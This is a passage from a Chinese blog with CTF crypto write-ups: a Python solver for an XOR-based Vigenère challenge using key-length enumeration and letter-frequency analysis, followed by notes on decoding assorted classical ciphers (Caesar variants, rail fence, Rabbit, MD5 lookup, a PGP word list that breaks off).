求出了密钥的长度，就可以如上述那样通过字频统计求出每一位密钥进而解密出原文了。 本题解法知道了传统维吉尼亚密码的解法，再看本题，也就不难了。虽然本题最终采用了异或的方式来加密原文，而不是传统维吉尼亚密码的偏移，但最终，只要能够求出密钥的长度，都可以使用字频分析的方法来计算出密钥来解密。 所以说，求解本题，主要也是首先确定密钥长度。 这里第一个思路就可以像以上求传统维吉尼亚密码那样通过计算重合指数来确定。然而有一点不可忽视的是，重合指数法只适合于给出的密文全部由字母加密而成的情况。传统维吉尼亚密码只能加密字母（偏移），这道题则通过异或的方法来加密，使得任意字符都可以生成对应的密文。因此，由于其它非字母字符的干扰，就无法求出准确的重合指数，也就难以通过重合指数法寻找出密钥长度。 注意到，本题使用的是异或形式来加密。是否还记得异或有几个独特性质： 1234a^a = 0 //一个数异或本身等于零a^0 = a //一个数异或零等于本身(a^b)^c = a^(b^c) //异或满足结合律a^b^b = a //因此，一个数两次异或同一个数等于本身 本题的密文是由明文与密钥异或而来的，因此 明文^密钥 = 密文，也就是明文 = 密文^密钥。关键点是，明文一定是由ascii字符组成的，并且密钥一定存在。如果假定出密钥的长度，那么可以将密文划分成相应的几组，密钥的取值范围又在一定的范围之内（unsigned char ，0~255）。因此，如果在假定的长度下，某一组密文在这个范围内找不到合理的密钥（使得与密文异或为ascii字符的密钥），那就说明密钥不可能是这个长度。 通过这种方式，就可以求得密钥可能的长度范围的取值，并且还可以求出这个长度下，各组密文对应密钥的可能值（使得这组密文全部能求得ascii范围内的明文的所有可能取值）。 求出了密钥的长度，以及每一位密钥的可能取值，再测试出每一位密钥可能取值解出原文对应的字频，取其中最符合自然英语的那一个，就可以猜测这是最终的密钥了。 具体实现首先，求出1~14范围内密钥的取值，如果有空集就证明不能为这个长度： 1234567891011def controlFlow(): keyLengthRange = range(1,15) cipher = readCipher(&#x27;c.txt&#x27;) for i in keyLengthRange: keyGroup = getKeyRange(i, cipher) for a in keyGroup: if 0 == len(a): break; #密钥每一位一定有值 else: #没有空集就通过字频求具体值 ...... #省略的代码 其中，getKeyRange求出每一位密钥的可能值： 1234567891011121314151617181920def getKeyRange(keyLength, cipher): &#x27;&#x27;&#x27; 测试每一位密钥可能的取值，若生成范围之外的明文，就抛弃这个值 否则，就将这个值加入结果集之中 &#x27;&#x27;&#x27; cipherGroup = getCipherGroup(keyLength, cipher) keyGroup = [[] for a in range(keyLength)] count=0 for perCipherGroup in cipherGroup: for keyTest in range(1,255): for perCipher in perCipherGroup: plainChar = perCipher^keyTest if plainChar not in range(32,127): break else: keyGroup[count].append(keyTest) count+=1 #下一组密文 return keyGroup 求出密钥范围，就通过字频统计求出具体值： 1234567891011121314151617181920212223242526272829303132333435363738394041424344def getLetterFrequency(key, perCipher):&#x27;&#x27;&#x27;求出综合字频&#x27;&#x27;&#x27; frequencies = &#123;&quot;e&quot;: 0.12702, &quot;t&quot;: 0.09056, &quot;a&quot;: 0.08167, &quot;o&quot;: 0.07507, &quot;i&quot;: 0.06966, &quot;n&quot;: 0.06749, &quot;s&quot;: 0.06327, &quot;h&quot;: 0.06094, &quot;r&quot;: 0.05987, &quot;d&quot;: 0.04253, &quot;l&quot;: 0.04025, &quot;c&quot;: 0.02782, &quot;u&quot;: 0.02758, &quot;m&quot;: 0.02406, &quot;w&quot;: 0.02360, &quot;f&quot;: 0.02228, &quot;g&quot;: 0.02015, &quot;y&quot;: 0.01974, &quot;p&quot;: 0.01929, &quot;b&quot;: 0.01492, &quot;v&quot;: 0.00978, &quot;k&quot;: 0.00772, &quot;j&quot;: 0.00153, &quot;x&quot;: 0.00150, &quot;q&quot;: 0.00095, &quot;z&quot;: 0.00074&#125; #各个字母的出现频率 count=&#123;&#125; for ch in perCipher: plainChar = key^ch if plainChar in range(65,91) or plainChar in range(97,123): #要排除非字母字符 char = chr(plainChar).lower() count[char] = count.setdefault(char, 0)+1 #这个字母出现的次数 freq = 0.0 for a in count: freq += frequencies[a]*count[a]/len(perCipher) #除以密文长度，以尽可能减小非字母字符对字频的影响 return freqdef getKeyConfirmValue(keyGroup,cipher): &#x27;&#x27;&#x27; 计算假定某一位上的密钥是正确的情况下，用这个密钥解密密文所出来的明文段落中字母的综合使用频率，正确的密钥这个频率应该尽可能高 &#x27;&#x27;&#x27; cipherGroup = getCipherGroup(len(keyGroup), cipher) key = [] count=0 for perKey in keyGroup: maxFreq = 0 tempKey = 0 for a in perKey: freq = getLetterFrequency(a, cipherGroup[count]) if freq&gt;maxFreq: #正确的密钥，算出来的综合字频应该尽可能大 maxFreq = freq tempKey = a key.append(tempKey) count += 1 return key 最后解密出原文： 1234567def cipherDecrypt(key, cipher): plainText = &#x27;&#x27; index = 0 for a in cipher: plainText += chr(key[index%len(key)]^a) index += 1 return plainText 最终得出的结果为： A possible key is: [186, 31, 145, 178, 83, 205, 62]A possible plainText is: Cryptography is the practice and study of techniques for, among other things, secure communication in the presence of attackers. Cryptography has been used for hundreds, if not thousands, of years, but traditional cryptosystems were designed and evaluated in a fairly ad hoc manner. For example, the Vigenere encryption scheme was thought to be secure for decades after it was invented, but we now know, and this exercise demonstrates, that it can be broken very easily. 题目中说falg是原文最后六个字母，没有标点，因此最终得到的falg为： nctf{it can be broken very easily} 对我一点也不简单就是了… 参考https://findneo.github.io/2017/10/nupt-vigenere/http://blog.csdn.net/qq_31344951/article/details/77934717 https://zh.wikipedia.org/wiki/维吉尼亚密码 https://www.zhihu.com/question/29515338 http://blog.csdn.net/limisky/article/details/16885959 完整代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899def readCipher(filename): file = open(filename, &#x27;r&#x27;) strCipher = file.read() cipher = [] index = 0 while index &lt; len(strCipher): cipher.append(int(strCipher[index:index+2], 16)) index += 2 return cipherdef getCipherGroup(keyLength, cipher): cipherGroup = [[] for a in range(keyLength)] count = 0 while count &lt; len(cipher): cipherGroup[(count) % keyLength] += [cipher[count]] count += 1 return cipherGroupdef getKeyRange(keyLength, cipher): cipherGroup = getCipherGroup(keyLength, cipher) keyGroup = [[] for a in range(keyLength)] count=0 for perCipherGroup in cipherGroup: for keyTest in range(1,255): for perCipher in perCipherGroup: plainChar = perCipher^keyTest if plainChar not in range(32,127): break else: keyGroup[count].append(keyTest) count+=1 return keyGroupdef getLetterFrequency(key, perCipher): frequencies = &#123;&quot;e&quot;: 0.12702, &quot;t&quot;: 0.09056, &quot;a&quot;: 0.08167, &quot;o&quot;: 0.07507, &quot;i&quot;: 0.06966, &quot;n&quot;: 0.06749, &quot;s&quot;: 0.06327, &quot;h&quot;: 0.06094, &quot;r&quot;: 0.05987, &quot;d&quot;: 0.04253, &quot;l&quot;: 0.04025, &quot;c&quot;: 0.02782, &quot;u&quot;: 0.02758, &quot;m&quot;: 0.02406, &quot;w&quot;: 0.02360, &quot;f&quot;: 0.02228, &quot;g&quot;: 0.02015, &quot;y&quot;: 0.01974, &quot;p&quot;: 0.01929, &quot;b&quot;: 0.01492, &quot;v&quot;: 0.00978, &quot;k&quot;: 0.00772, &quot;j&quot;: 0.00153, &quot;x&quot;: 0.00150, &quot;q&quot;: 0.00095, &quot;z&quot;: 0.00074&#125; count=&#123;&#125; for ch in perCipher: plainChar = key^ch if plainChar in range(65,91) or plainChar in range(97,123): char = chr(plainChar).lower() count[char] = count.setdefault(char, 0)+1 freq = 0.0 for a in count: freq += frequencies[a]*count[a]/len(perCipher) return freqdef getKeyConfirmValue(keyGroup,cipher): cipherGroup = getCipherGroup(len(keyGroup), cipher) key = [] count=0 for perKey in keyGroup: maxFreq = 0 tempKey = 0 for a in perKey: freq = getLetterFrequency(a, cipherGroup[count]) if freq&gt;maxFreq: maxFreq = freq tempKey = a key.append(tempKey) count += 1 return keydef cipherDecrypt(key, cipher): plainText = &#x27;&#x27; index = 0 for a in cipher: plainText += chr(key[index%len(key)]^a) index += 1 return plainTextdef controlFlow(): keyLengthRange = range(1,15) cipher = readCipher(&#x27;c.txt&#x27;) for i in keyLengthRange: keyGroup = getKeyRange(i, cipher) for a in keyGroup: if 0 == len(a): break; else: #print(&#x27;A possible key group is:&#x27;, keyGroup,&#x27;\\\\n&#x27;) key = getKeyConfirmValue(keyGroup, cipher) print(&#x27;A possible key is:&#x27;, key,&#x27;\\\\n&#x27;) plainText = cipherDecrypt(key, cipher) print(&#x27;A possible plainText is:&#x27;, plainText,&#x27;\\\\n&#x27;)if __name__==&#x27;__main__&#x27;: controlFlow() 另一个可用版本的 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475def findindexkey(subarr):#该函数可以找出将密文subarr解密成可见字符的所有可能值 visiable_chars=[]#可见字符 for x in range(32,126): visiable_chars.append(chr(x)) #print(vi) test_keys=[]#用于测试密钥 ans_keys=[]#用于结果的返回 for x in range(0x00,0xFF):# 枚举密钥里所有的值 test_keys.append(x) ans_keys.append(x) for i in test_keys:#对于0x00~0xFF里的每一个数i和subarr里的每个值s异或 for s in subarr: if chr(s^i) not in visiable_chars:#用i解密s，如果解密后明文不是可见字符，说明i不是密钥 ans_keys.remove(i)#去掉ans_keys里测试失败的密钥 break #print(ans_keys) return ans_keys strmi=&#x27;F96DE8C227A259C87EE1DA2AED57C93FE5DA36ED4EC87EF2C63AAE5B9A7EFFD673BE4ACF7BE8923C\\\\AB1ECE7AF2DA3DA44FCF7AE29235A24C963FF0DF3CA3599A70E5DA36BF1ECE77F8DC34BE129A6CF4D126BF\\\\5B9A7CFEDF3EB850D37CF0C63AA2509A76FF9227A55B9A6FE3D720A850D97AB1DD35ED5FCE6BF0D138A84C\\\\C931B1F121B44ECE70F6C032BD56C33FF9D320ED5CDF7AFF9226BE5BDE3FF7DD21ED56CF71F5C036A94D96\\\\3FF8D473A351CE3FE5DA3CB84DDB71F5C17FED51DC3FE8D732BF4D963FF3C727ED4AC87EF5DB27A451D47E\\\\FD9230BF47CA6BFEC12ABE4ADF72E29224A84CDF3FF5D720A459D47AF59232A35A9A7AE7D33FB85FCE7AF5\\\\923AA31EDB3FF7D33ABF52C33FF0D673A551D93FFCD33DA35BC831B1F43CBF1EDF67F0DF23A15B963FE5DA\\\\36ED68D378F4DC36BF5B9A7AFFD121B44ECE76FEDC73BE5DD27AFCD773BA5FC93FE5DA3CB859D26BB1C63C\\\\ED5CDF3FE2D730B84CDF3FF7DD21ED5ADF7CF0D636BE1EDB79E5D721ED57CE3FE6D320ED57D469F4DC27A8\\\\5A963FF3C727ED49DF3FFFDD24ED55D470E69E73AC50DE3FE5DA3ABE1EDF67F4C030A44DDF3FF5D73EA250\\\\C96BE3D327A84D963FE5DA32B91ED36BB1D132A31ED87AB1D021A255DF71B1C436BF479A7AF0C13AA14794&#x27;arr=[]#密文，每个元素为字符的ascii码for x in range(0,len(strmi),2): arr.append(int(strmi[x:2+x],16)) for keylen in range(1,14):#枚举密钥的长度1~14 for index in range(0,keylen):#对密钥里的第index个进行测试 subarr=arr[index::keylen]#每隔keylen长度提取密文的内容，提取出来的内容都被密文的第index个加密 ans_keys=findindexkey(subarr)#找出密钥中第index个的可能的值 print(&#x27;keylen=&#x27;,keylen,&#x27;index=&#x27;,index,&#x27;keys=&#x27;,ans_keys) if ans_keys:#如果密钥第index个有可能存在，尝试用密钥的index个去解密文 ch=[] for x in ans_keys: ch.append(chr(x^subarr[0])) print(ch)#运行到这里，观察输出可以发现，密钥长度为7时有解print(&#x27;###############&#x27;)import stringdef findindexkey2(subarr):#再造一个函数筛选密钥 test_chars=string.ascii_letters+string.digits+&#x27;,&#x27;+&#x27;.&#x27;+&#x27; &#x27;#将检查的字符改为英文+数字+逗号+句号+空格 #print(test_chars) test_keys=[]#用于测试密钥 ans_keys=[]#用于结果的返回 for x in range(0x00,0xFF):# 枚举密钥里所有的值 test_keys.append(x) ans_keys.append(x) for i in test_keys:#对于0x00~0xFF里的每一个数i和substr里的每个值s异或 for s in subarr: if chr(s^i) not in test_chars:#用i解密s，如果解密后不是英文、数字、逗号、句号、空格，说明i不是密钥 ans_keys.remove(i)#去掉ans_keys里测试失败的密钥 break #print(ans_keys) return ans_keys vigenerekeys=[]#维基尼尔密码的密钥for index in range(0,7):#已经知道密钥长度是7 subarr=arr[index::7] vigenerekeys.append(findindexkey2(subarr))print(vigenerekeys)#输出的是[[186], [31], [145], [178], [83], [205], [62]]. print(&quot;#########&quot;)ming=&#x27;&#x27;for i in range(0,len(arr)): ming=ming+chr(arr[i]^vigenerekeys[i%7][0])print(ming) vigenere.py 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475def findindexkey(subarr):#该函数可以找出将密文subarr解密成可见字符的所有可能值 visiable_chars=[]#可见字符 for x in range(32,126): visiable_chars.append(chr(x)) #print(vi) test_keys=[]#用于测试密钥 ans_keys=[]#用于结果的返回 for x in range(0x00,0xFF):# 枚举密钥里所有的值 test_keys.append(x) ans_keys.append(x) for i in test_keys:#对于0x00~0xFF里的每一个数i和subarr里的每个值s异或 for s in subarr: if chr(s^i) not in visiable_chars:#用i解密s，如果解密后明文不是可见字符，说明i不是密钥 ans_keys.remove(i)#去掉ans_keys里测试失败的密钥 break #print(ans_keys) return ans_keys strmi=&#x27;F96DE8C227A259C87EE1DA2AED57C93FE5DA36ED4EC87EF2C63AAE5B9A7EFFD673BE4ACF7BE8923C\\AB1ECE7AF2DA3DA44FCF7AE29235A24C963FF0DF3CA3599A70E5DA36BF1ECE77F8DC34BE129A6CF4D126BF\\5B9A7CFEDF3EB850D37CF0C63AA2509A76FF9227A55B9A6FE3D720A850D97AB1DD35ED5FCE6BF0D138A84C\\C931B1F121B44ECE70F6C032BD56C33FF9D320ED5CDF7AFF9226BE5BDE3FF7DD21ED56CF71F5C036A94D96\\3FF8D473A351CE3FE5DA3CB84DDB71F5C17FED51DC3FE8D732BF4D963FF3C727ED4AC87EF5DB27A451D47E\\FD9230BF47CA6BFEC12ABE4ADF72E29224A84CDF3FF5D720A459D47AF59232A35A9A7AE7D33FB85FCE7AF5\\923AA31EDB3FF7D33ABF52C33FF0D673A551D93FFCD33DA35BC831B1F43CBF1EDF67F0DF23A15B963FE5DA\\36ED68D378F4DC36BF5B9A7AFFD121B44ECE76FEDC73BE5DD27AFCD773BA5FC93FE5DA3CB859D26BB1C63C\\ED5CDF3FE2D730B84CDF3FF7DD21ED5ADF7CF0D636BE1EDB79E5D721ED57CE3FE6D320ED57D469F4DC27A8\\5A963FF3C727ED49DF3FFFDD24ED55D470E69E73AC50DE3FE5DA3ABE1EDF67F4C030A44DDF3FF5D73EA250\\C96BE3D327A84D963FE5DA32B91ED36BB1D132A31ED87AB1D021A255DF71B1C436BF479A7AF0C13AA14794&#x27;arr=[]#密文，每个元素为字符的ascii码for x in range(0,len(strmi),2): arr.append(int(strmi[x:2+x],16)) for keylen in range(1,14):#枚举密钥的长度1~14 for index in range(0,keylen):#对密钥里的第index个进行测试 subarr=arr[index::keylen]#每隔keylen长度提取密文的内容，提取出来的内容都被密文的第index个加密 ans_keys=findindexkey(subarr)#找出密钥中第index个的可能的值 print(&#x27;keylen=&#x27;,keylen,&#x27;index=&#x27;,index,&#x27;keys=&#x27;,ans_keys) if ans_keys:#如果密钥第index个有可能存在，尝试用密钥的index个去解密文 ch=[] for x in ans_keys: ch.append(chr(x^subarr[0])) print(ch)#运行到这里，观察输出可以发现，密钥长度为7时有解print(&#x27;###############&#x27;)import stringdef findindexkey2(subarr):#再造一个函数筛选密钥 test_chars=string.ascii_letters+string.digits+&#x27;,&#x27;+&#x27;.&#x27;+&#x27; &#x27;#将检查的字符改为英文+数字+逗号+句号+空格 #print(test_chars) test_keys=[]#用于测试密钥 ans_keys=[]#用于结果的返回 for x in range(0x00,0xFF):# 枚举密钥里所有的值 test_keys.append(x) ans_keys.append(x) for i in test_keys:#对于0x00~0xFF里的每一个数i和substr里的每个值s异或 for s in subarr: if chr(s^i) not in test_chars:#用i解密s，如果解密后不是英文、数字、逗号、句号、空格，说明i不是密钥 ans_keys.remove(i)#去掉ans_keys里测试失败的密钥 break #print(ans_keys) return ans_keys vigenerekeys=[]#维基尼尔密码的密钥for index in range(0,7):#已经知道密钥长度是7 subarr=arr[index::7] vigenerekeys.append(findindexkey2(subarr))print(vigenerekeys)#输出的是[[186], [31], [145], [178], [83], [205], [62]]. print(&quot;#########&quot;)ming=&#x27;&#x27;for i in range(0,len(arr)): ming=ming+chr(arr[i]^vigenerekeys[i%7][0])print(ming)","categories":[{"name":"密码学","slug":"密码学","permalink":"https://gryffinbit.top/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"}],"tags":[{"name":"古典密码","slug":"古典密码","permalink":"https://gryffinbit.top/tags/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81/"}],"author":"Gryffinbit"},{"title":"一些杂乱的密码","slug":"一些杂乱的密码","date":"2020-11-14T16:49:43.000Z","updated":"2024-11-12T06:59:56.000Z","comments":true,"path":"2020/11/15/一些杂乱的密码/","permalink":"https://gryffinbit.top/2020/11/15/%E4%B8%80%E4%BA%9B%E6%9D%82%E4%B9%B1%E7%9A%84%E5%AF%86%E7%A0%81/","excerpt":"","text":"记录遇到的一些奇奇怪怪的密码###变异凯撒 第一位 偏移5，第二位偏移6 ， 第三位偏移7 ，第四位偏移8……以此类推 12345k = 5 str = &#x27;afZ_r9VYfScOeO_UL^RWUc&#x27; for i in str: print(chr(ord(i)+k),end=&quot;&quot;) k +=1 ###quoted_printable_decode &#x3D;E9&#x3D;82&#x3D;A3&#x3D;E4&#x3D;BD&#x3D;A0&#x3D;E4&#x3D;B9&#x3D;9F&#x3D;E5&#x3D;BE&#x3D;88&#x3D;E6&#x3D;A3&#x3D;92&#x3D;E5&#x3D;93&#x3D;A6 解密：那你也很棒哦 ###Rabbit U2FsdGVkX1&#x2F;+ydnDPowGbjjJXhZxm2MP2AgI 解密：Cute_Rabbit ###栅栏密码 felhaagv{ewtehtehfilnakgw} 解密： 1flag&#123;wethinkwehavetheflag&#125; ###生僻字 老文盲了“罼雧締眔擴灝淛匶襫黼瀬鎶軄鶛驕鳓哵眔鞹鰝”萌新初体验，这道题丧心病狂，把前面几个生僻字拼音找了出来，发现刚好首字母是BJD，后三个发现是大括号的谐音，结尾三个也是如此，可得BJD{淛匶襫黼瀬鎶軄鶛驕鳓哵} ###维吉尼亚密码（偏移密码，key是字母） 题目： 小燕子，穿花衣，年年春天来这里，我问燕子你为啥来，燕子说:79616E7A69205A4A517B78696C7A765F6971737375686F635F73757A6A677D20 分析后面的字符串为16进制，转换为字符为yanzi ZJQ{xilzv_iqssuhoc_suzjg} 。分析得到字符串猜测为维吉尼亚密码，yanzi为秘钥。解密后得到BJD{yanzi_jiushige_shabi}。 所以flag为flag{yanzi_jiushige_shabi}。 ###六十甲子顺序表 辛卯，癸巳，丙戌，辛未，庚辰，癸酉，己卯，癸巳。 ###替换&#x2F;移位密码的暴力破解 词频分析 当偏移的位数不确定时，但能明显看出来需要破解的密码是顺序混乱后的样子，可以采用暴力破解 MTHJ{CUBCGXGUGXWREXIPOYAOEYFIGXWRXCHTKHFCOHCFDUCGTXZOHIXOEOWMEHZO} tip：已知MTHJ&#x3D;flag 破解的网站：https://quipqiup.com/ 猪圈密码 变种：圣堂武士密码 MD5Administrator:500:806EDC27AA52E314AAD3B435B51404EE:F4AD50F57683D4260DFD48AA351A17A8::: 其中的：F4AD50F57683D4260DFD48AA351A17A8 MD5在线解密为：3617656 PGP词汇表 （生物识别词汇表）123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281aaa=[[&quot;00&quot;,&quot;aardvark&quot;,&quot;adroitness&quot;],[&quot;01&quot;,&quot;absurd&quot;,&quot;adviser&quot;],[&quot;02&quot;,&quot;accrue&quot;,&quot;aftermath&quot;],[&quot;03&quot;,&quot;acme&quot;,&quot;aggregate&quot;],[&quot;04&quot;,&quot;adrift&quot;,&quot;alkali&quot;],[&quot;05&quot;,&quot;adult&quot;,&quot;almighty&quot;],[&quot;06&quot;,&quot;afflict&quot;,&quot;amulet&quot;],[&quot;07&quot;,&quot;ahead&quot;,&quot;amusement&quot;],[&quot;08&quot;,&quot;aimless&quot;,&quot;antenna&quot;],[&quot;09&quot;,&quot;Algol&quot;,&quot;applicant&quot;],[&quot;0A&quot;,&quot;allow&quot;,&quot;Apollo&quot;],[&quot;0B&quot;,&quot;alone&quot;,&quot;armistice&quot;],[&quot;0C&quot;,&quot;ammo&quot;,&quot;article&quot;],[&quot;0D&quot;,&quot;ancient&quot;,&quot;asteroid&quot;],[&quot;0E&quot;,&quot;apple&quot;,&quot;Atlantic&quot;],[&quot;0F&quot;,&quot;artist&quot;,&quot;atmosphere&quot;],[&quot;10&quot;,&quot;assume&quot;,&quot;autopsy&quot;],[&quot;11&quot;,&quot;Athens&quot;,&quot;Babylon&quot;],[&quot;12&quot;,&quot;atlas&quot;,&quot;backwater&quot;],[&quot;13&quot;,&quot;Aztec&quot;,&quot;barbecue&quot;],[&quot;14&quot;,&quot;baboon&quot;,&quot;belowground&quot;],[&quot;15&quot;,&quot;backfield&quot;,&quot;bifocals&quot;],[&quot;16&quot;,&quot;backward&quot;,&quot;bodyguard&quot;],[&quot;17&quot;,&quot;banjo&quot;,&quot;bookseller&quot;],[&quot;18&quot;,&quot;beaming&quot;,&quot;borderline&quot;],[&quot;19&quot;,&quot;bedlamp&quot;,&quot;bottomless&quot;],[&quot;1A&quot;,&quot;beehive&quot;,&quot;Bradbury&quot;],[&quot;1B&quot;,&quot;beeswax&quot;,&quot;bravado&quot;],[&quot;1C&quot;,&quot;befriend&quot;,&quot;Brazilian&quot;],[&quot;1D&quot;,&quot;Belfast&quot;,&quot;breakaway&quot;],[&quot;1E&quot;,&quot;berserk&quot;,&quot;Burlington&quot;],[&quot;1F&quot;,&quot;billiard&quot;,&quot;businessman&quot;],[&quot;20&quot;,&quot;bison&quot;,&quot;butterfat&quot;],[&quot;21&quot;,&quot;blackjack&quot;,&quot;Camelot&quot;],[&quot;22&quot;,&quot;blockade&quot;,&quot;candidate&quot;],[&quot;23&quot;,&quot;blowtorch&quot;,&quot;cannonball&quot;],[&quot;24&quot;,&quot;bluebird&quot;,&quot;Capricorn&quot;],[&quot;25&quot;,&quot;bombast&quot;,&quot;caravan&quot;],[&quot;26&quot;,&quot;bookshelf&quot;,&quot;caretaker&quot;],[&quot;27&quot;,&quot;brackish&quot;,&quot;celebrate&quot;],[&quot;28&quot;,&quot;breadline&quot;,&quot;cellulose&quot;],[&quot;29&quot;,&quot;breakup&quot;,&quot;certify&quot;],[&quot;2A&quot;,&quot;brickyard&quot;,&quot;chambermaid&quot;],[&quot;2B&quot;,&quot;briefcase&quot;,&quot;Cherokee&quot;],[&quot;2C&quot;,&quot;Burbank&quot;,&quot;Chicago&quot;],[&quot;2D&quot;,&quot;button&quot;,&quot;clergyman&quot;],[&quot;2E&quot;,&quot;buzzard&quot;,&quot;coherence&quot;],[&quot;2F&quot;,&quot;cement&quot;,&quot;combustion&quot;],[&quot;30&quot;,&quot;chairlift&quot;,&quot;commando&quot;],[&quot;31&quot;,&quot;chatter&quot;,&quot;company&quot;],[&quot;32&quot;,&quot;checkup&quot;,&quot;component&quot;],[&quot;33&quot;,&quot;chisel&quot;,&quot;concurrent&quot;],[&quot;34&quot;,&quot;choking&quot;,&quot;confidence&quot;],[&quot;35&quot;,&quot;chopper&quot;,&quot;conformist&quot;],[&quot;36&quot;,&quot;Christmas&quot;,&quot;congregate&quot;],[&quot;37&quot;,&quot;clamshell&quot;,&quot;consensus&quot;],[&quot;38&quot;,&quot;classic&quot;,&quot;consulting&quot;],[&quot;39&quot;,&quot;classroom&quot;,&quot;corporate&quot;],[&quot;3A&quot;,&quot;cleanup&quot;,&quot;corrosion&quot;],[&quot;3B&quot;,&quot;clockwork&quot;,&quot;councilman&quot;],[&quot;3C&quot;,&quot;cobra&quot;,&quot;crossover&quot;],[&quot;3D&quot;,&quot;commence&quot;,&quot;crucifix&quot;],[&quot;3E&quot;,&quot;concert&quot;,&quot;cumbersome&quot;],[&quot;3F&quot;,&quot;cowbell&quot;,&quot;customer&quot;],[&quot;40&quot;,&quot;crackdown&quot;,&quot;Dakota&quot;],[&quot;41&quot;,&quot;cranky&quot;,&quot;decadence&quot;],[&quot;42&quot;,&quot;crowfoot&quot;,&quot;December&quot;],[&quot;43&quot;,&quot;crucial&quot;,&quot;decimal&quot;],[&quot;44&quot;,&quot;crumpled&quot;,&quot;designing&quot;],[&quot;45&quot;,&quot;crusade&quot;,&quot;detector&quot;],[&quot;46&quot;,&quot;cubic&quot;,&quot;detergent&quot;],[&quot;47&quot;,&quot;dashboard&quot;,&quot;determine&quot;],[&quot;48&quot;,&quot;deadbolt&quot;,&quot;dictator&quot;],[&quot;49&quot;,&quot;deckhand&quot;,&quot;dinosaur&quot;],[&quot;4A&quot;,&quot;dogsled&quot;,&quot;direction&quot;],[&quot;4B&quot;,&quot;dragnet&quot;,&quot;disable&quot;],[&quot;4C&quot;,&quot;drainage&quot;,&quot;disbelief&quot;],[&quot;4D&quot;,&quot;dreadful&quot;,&quot;disruptive&quot;],[&quot;4E&quot;,&quot;drifter&quot;,&quot;distortion&quot;],[&quot;4F&quot;,&quot;dropper&quot;,&quot;document&quot;],[&quot;50&quot;,&quot;drumbeat&quot;,&quot;embezzle&quot;],[&quot;51&quot;,&quot;drunken&quot;,&quot;enchanting&quot;],[&quot;52&quot;,&quot;Dupont&quot;,&quot;enrollment&quot;],[&quot;53&quot;,&quot;dwelling&quot;,&quot;enterprise&quot;],[&quot;54&quot;,&quot;eating&quot;,&quot;equation&quot;],[&quot;55&quot;,&quot;edict&quot;,&quot;equipment&quot;],[&quot;56&quot;,&quot;egghead&quot;,&quot;escapade&quot;],[&quot;57&quot;,&quot;eightball&quot;,&quot;Eskimo&quot;],[&quot;58&quot;,&quot;endorse&quot;,&quot;everyday&quot;],[&quot;59&quot;,&quot;endow&quot;,&quot;examine&quot;],[&quot;5A&quot;,&quot;enlist&quot;,&quot;existence&quot;],[&quot;5B&quot;,&quot;erase&quot;,&quot;exodus&quot;],[&quot;5C&quot;,&quot;escape&quot;,&quot;fascinate&quot;],[&quot;5D&quot;,&quot;exceed&quot;,&quot;filament&quot;],[&quot;5E&quot;,&quot;eyeglass&quot;,&quot;finicky&quot;],[&quot;5F&quot;,&quot;eyetooth&quot;,&quot;forever&quot;],[&quot;60&quot;,&quot;facial&quot;,&quot;fortitude&quot;],[&quot;61&quot;,&quot;fallout&quot;,&quot;frequency&quot;],[&quot;62&quot;,&quot;flagpole&quot;,&quot;gadgetry&quot;],[&quot;63&quot;,&quot;flatfoot&quot;,&quot;Galveston&quot;],[&quot;64&quot;,&quot;flytrap&quot;,&quot;getaway&quot;],[&quot;65&quot;,&quot;fracture&quot;,&quot;glossary&quot;],[&quot;66&quot;,&quot;framework&quot;,&quot;gossamer&quot;],[&quot;67&quot;,&quot;freedom&quot;,&quot;graduate&quot;],[&quot;68&quot;,&quot;frighten&quot;,&quot;gravity&quot;],[&quot;69&quot;,&quot;gazelle&quot;,&quot;guitarist&quot;],[&quot;6A&quot;,&quot;Geiger&quot;,&quot;hamburger&quot;],[&quot;6B&quot;,&quot;glitter&quot;,&quot;Hamilton&quot;],[&quot;6C&quot;,&quot;glucose&quot;,&quot;handiwork&quot;],[&quot;6D&quot;,&quot;goggles&quot;,&quot;hazardous&quot;],[&quot;6E&quot;,&quot;goldfish&quot;,&quot;headwaters&quot;],[&quot;6F&quot;,&quot;gremlin&quot;,&quot;hemisphere&quot;],[&quot;70&quot;,&quot;guidance&quot;,&quot;hesitate&quot;],[&quot;71&quot;,&quot;hamlet&quot;,&quot;hideaway&quot;],[&quot;72&quot;,&quot;highchair&quot;,&quot;holiness&quot;],[&quot;73&quot;,&quot;hockey&quot;,&quot;hurricane&quot;],[&quot;74&quot;,&quot;indoors&quot;,&quot;hydraulic&quot;],[&quot;75&quot;,&quot;indulge&quot;,&quot;impartial&quot;],[&quot;76&quot;,&quot;inverse&quot;,&quot;impetus&quot;],[&quot;77&quot;,&quot;involve&quot;,&quot;inception&quot;],[&quot;78&quot;,&quot;island&quot;,&quot;indigo&quot;],[&quot;79&quot;,&quot;jawbone&quot;,&quot;inertia&quot;],[&quot;7A&quot;,&quot;keyboard&quot;,&quot;infancy&quot;],[&quot;7B&quot;,&quot;kickoff&quot;,&quot;inferno&quot;],[&quot;7C&quot;,&quot;kiwi&quot;,&quot;informant&quot;],[&quot;7D&quot;,&quot;klaxon&quot;,&quot;insincere&quot;],[&quot;7E&quot;,&quot;locale&quot;,&quot;insurgent&quot;],[&quot;7F&quot;,&quot;lockup&quot;,&quot;integrate&quot;],[&quot;80&quot;,&quot;merit&quot;,&quot;intention&quot;],[&quot;81&quot;,&quot;minnow&quot;,&quot;inventive&quot;],[&quot;82&quot;,&quot;miser&quot;,&quot;Istanbul&quot;],[&quot;83&quot;,&quot;Mohawk&quot;,&quot;Jamaica&quot;],[&quot;84&quot;,&quot;mural&quot;,&quot;Jupiter&quot;],[&quot;85&quot;,&quot;music&quot;,&quot;leprosy&quot;],[&quot;86&quot;,&quot;necklace&quot;,&quot;letterhead&quot;],[&quot;87&quot;,&quot;Neptune&quot;,&quot;liberty&quot;],[&quot;88&quot;,&quot;newborn&quot;,&